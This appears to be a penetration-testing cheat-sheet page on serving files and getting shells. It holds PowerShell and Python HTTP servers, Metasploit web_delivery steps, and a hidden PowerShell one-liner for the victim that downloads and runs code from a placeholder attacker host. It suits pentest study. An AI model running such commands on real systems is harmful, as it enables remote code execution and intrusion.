---
title: Shells and Web Servers
category: Exploitation
order: 97
---

> **One-Line HTTP Servers**

Create Server | python -m SimpleHTTPServer 8000

> **Powershell HTTP Servers**

{% highlight powershell %}
$Hso = New-Object Net.HttpListener
$Hso.Prefixes.Add("http://+:8000/")
$Hso.Start()
While ($Hso.IsListening) {
    $HC = $Hso.GetContext()
    $HRes = $HC.Response
    $HRes.Headers.Add("Content-Type","text/plain")
    $Buf = [Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($HC.Request).RawUrl)))
    $HRes.ContentLength64 = $Buf.Length
    $HRes.OutputStream.Write($Buf,0,$Buf.Length)
    $HRes.Close()
}
$Hso.Stop()
{% endhighlight %}

> **Powershell Reverse Shells**

http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-3.html

> **Script Web Delivery** 

https://securitypadawan.blogspot.com/2014/02/php-meterpreter-web-delivery.html
On the attacker machine: 
{% highlight bash %}
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > show targets
            ...targets...
msf exploit(web_delivery) > set TARGET <target-id>
msf exploit(web_delivery) > show options
            ...show and set options...
msf exploit(web_delivery) > exploit
{% endhighlight %}

On the victim: 
{% highlight bash %}
powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://10.10.10.10:80/[randomstring]'))
{% endhighlight %}
    


> **Useful Resources** 
https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html
* [Bash, PHP, Netcat, Telnet, Perl, Ruby, Java, Python, Gawk](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

